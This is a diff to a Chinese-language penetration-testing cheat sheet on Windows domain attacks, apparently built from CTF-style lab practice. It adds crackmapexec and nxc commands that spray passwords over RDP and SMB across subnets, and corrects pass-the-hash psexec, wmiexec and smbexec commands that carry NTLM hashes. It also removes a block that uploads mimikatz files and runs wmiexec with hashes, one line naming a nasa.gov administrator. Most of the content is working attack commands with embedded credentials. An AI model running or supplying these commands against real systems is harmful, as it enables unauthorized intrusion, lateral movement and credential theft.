@@ -55,6 +55,13 @@ make_token GOD\Administrator mac1234!
 shell dir \\OWA\C$ # 成功访问域控
 pth GOD\Administrator e97afaff5812d7cc281147091ebb4dc7 # 域管理员哈希传递, 然后访问域控
 ```
+### 横向渗透
+```sh
+# 测试账号能否登录 其他 IP
+proxychains -q nxc rdp 172.23.4.51/24 -u usera -p Admin3gv83 -d pentest.me
+# 支持 SMB、LDAP、WINRM、MSSQL、SSH、FTP、RDP
+proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -d xiaorang.lab -M Webdav
+```
 
 ## 域维护命令
 
@@ -289,9 +296,9 @@ mimikatz.exe sekurlsa::pth /user:fuwuqi /domain:172.16.235.6 /ntlm:f9272c84db38a
 # pth 读取数据
 proxychains crackmapexec smb 172.22.8.15 -u WIN2016$ -H290b14ec023182beeb4890dbe5b9774b -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
 # pth 攻击
-proxychians python psexec.py  -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 "whoami"
-proxychians python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 "whoami"
-proxychians python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
+proxychains python psexec.py  -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 "whoami"
+proxychains python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 "whoami"
+proxychains python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
 ```
 
 pth 连接后上传马
@@ -397,25 +404,8 @@ net use P: \\Name\zhq3211
 
 # Tools
 
-## impacket/wmiexec.py
+## [impacket/wmiexec.py](90_tools.md#impacketwmiexecpy)
 
-```sh
- lcd {path}                 - changes the current local directory to {path}
- exit                       - terminates the server process (and this session)
- lput {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
- lget {file}                 - downloads pathname to the current local dir
- ! {cmd}                    - executes a local shell cmd
-
-proxychains python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:fbe5588a79e40d41d77a40569c7b3090 nasa.gov/administrator@10.10.10.140 -codec gbk
-proxychains python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3
-
-## 上传文件
-lput /tmp/m/mimilib.dll .
-lput /tmp/m/mimispool.dll .
-lput /tmp/m/mimikatz.exe .
-## 下载文件
-lget ./file
-```
 
 # Article
 
